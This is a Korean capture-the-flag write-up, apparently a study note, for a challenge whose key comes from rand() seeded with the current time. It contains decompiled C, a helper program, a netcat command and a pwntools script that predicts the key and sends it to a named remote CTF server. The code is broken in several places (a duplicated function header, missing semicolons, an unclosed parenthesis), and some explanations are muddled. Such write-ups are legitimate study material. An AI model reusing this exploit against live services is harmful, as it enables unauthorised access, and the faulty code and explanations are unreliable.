@@ -1,0 +1,105 @@
+random key 풀이
+
+보호기법을 확인했을떄 NX만 걸려있었으므로 전 문제와 똑같이 쉘코드를 사용할수없다.
+
+코드를 살펴보면
+
+
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  int v4; // [rsp+0h] [rbp-10h]
+  int v5; // [rsp+4h] [rbp-Ch]
+  unsigned __int64 v6; // [rsp+8h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  setbuf(_bss_start, 0LL);
+  v4 = 0;
+  v3 = time(0LL);
+  srand(v3);
+  v5 = rand();
+  puts("============================");
+  puts(asc_400948);
+  puts("============================");
+  printf("Input Key : ", 0LL, *(_QWORD *)&v4, v6);
+  __isoc99_scanf("%d", &v4);
+  if ( v5 == v4 )
+  {
+    puts("Correct!");
+    system("cat /home/random/flag");
+    exit(0);
+  }
+  puts("Nah...");
+  exit(0);
+}
+
+인데  v3를 보면 time(0LL) 이고 srand(v3) 이기떄문에 이소리는 1970년 이후 시간을 카운트 한다는 소리이므로
+
+그 카운트한 시간(값)과 우리가 입력한 값이 맞으면 쉘코드를 보여준다는 뜻이다.
+
+즉 카운트한 시간을 같게하려면 동시에 파일을 서버내에서 실행시켜야한다. 그러기위해서는 ; 이라는 리눅스 기법을 사용한다.
+
+일단 카운트한 값을 출력하는 소스코드를 만들어보자.
+
+random.c
+
+#include<stdio.h>
+#include<stdlib.h>
+#include<time.h>
+
+int main()
+{
+	srand(time(NULL));
+	printf("%d\n", rand());
+	return 0;
+}
+
+이다. 이 소스를 컴파일하고 원래 파일과 이소스파일을 동시에 실행시켜야하므로.
+
+./random ; nc ctf.j0n9hyun.xyz 3014
+
+이다 실행시키면 내가 출력하고자하는 카운트 값이 나오는데 그대로 input 에 집어넣으면 답이나온다.
+
+( 현재 나는 오류가 떴기떄문에 집에서도 해보고 안되면 페이로드로 작성해서 풀이 다시 작성 )	>> 해결 (   )
+
+
+따라서 페이로드를 작성하는 방식으로 풀어보자.
+
+일단 내가 만들었던 소스코드를 다시만들고 컴파일해보자.
+
+
+random.c
+
+#include<stdio.h>
+#include<stdlib.h>
+#include<time.h>
+
+int solve()
+
+int solve()
+{
+	srand(time(NULL));
+	int answer = rand()
+	return answer;
+}
+
+
+gcc -shared -o ran.so -fPIC random.c 으로 컴파일 해주고.
+
+그러면 ran.so 라는 so파일이 만들어진다.
+
+페이로드를 작성해보자.
+
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz', 3014)
+so = CDLL("./ran.so")
+
+random_key = so.solve()
+
+p.recvuntil(' : ')
+p.sendline(str(random_key)
+p.interactive() 
+
+
+해주면 쉘에 접속이되면서 cat flag 를 실행하면 플래그가 나온다.
